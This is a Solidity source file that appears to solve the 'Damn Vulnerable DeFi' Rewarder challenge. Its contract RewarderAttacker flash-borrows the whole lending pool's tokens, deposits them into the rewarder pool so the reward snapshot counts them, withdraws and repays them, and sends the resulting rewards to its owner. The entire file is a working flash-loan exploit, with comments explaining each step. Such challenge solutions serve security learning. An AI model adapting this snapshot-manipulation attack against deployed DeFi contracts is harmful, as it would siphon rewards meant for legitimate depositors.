// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";
import "../DamnValuableToken.sol";
import {AccountingToken} from "./AccountingToken.sol";
import {RewardToken} from "./RewardToken.sol";

contract RewarderAttacker {
    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public liquidityToken;
    AccountingToken public accountingToken;
    RewardToken public rewardToken;
    address public owner;

    constructor(
        FlashLoanerPool _flashLoanerPool,
        TheRewarderPool _rewarderPool,
        DamnValuableToken _liquidityToken,
        AccountingToken _accountingToken,
        RewardToken _rewardToken
    ) {
        flashLoanerPool = _flashLoanerPool;
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
        accountingToken = _accountingToken;
        rewardToken = _rewardToken;
        owner = msg.sender;
    }

    // Borrow all tokens from the flash loan pool
    function borrow() public {
        uint256 balancePool = liquidityToken.balanceOf(
            address(flashLoanerPool)
        );
        flashLoanerPool.flashLoan(balancePool);
    }

    // We deposit the borrowed tokens in the pool and snapshot is taken
    // Then we withdraw the tokens and return them to the lender
    // Thanks to the snapshot taken we'll be able to receive immense rewards
    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

    // Here we collect the rewards and transfer them to the owner of the contract
    function distributeRewards() external {
        rewarderPool.distributeRewards();
        uint256 rewardsBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, rewardsBalance);
    }
}
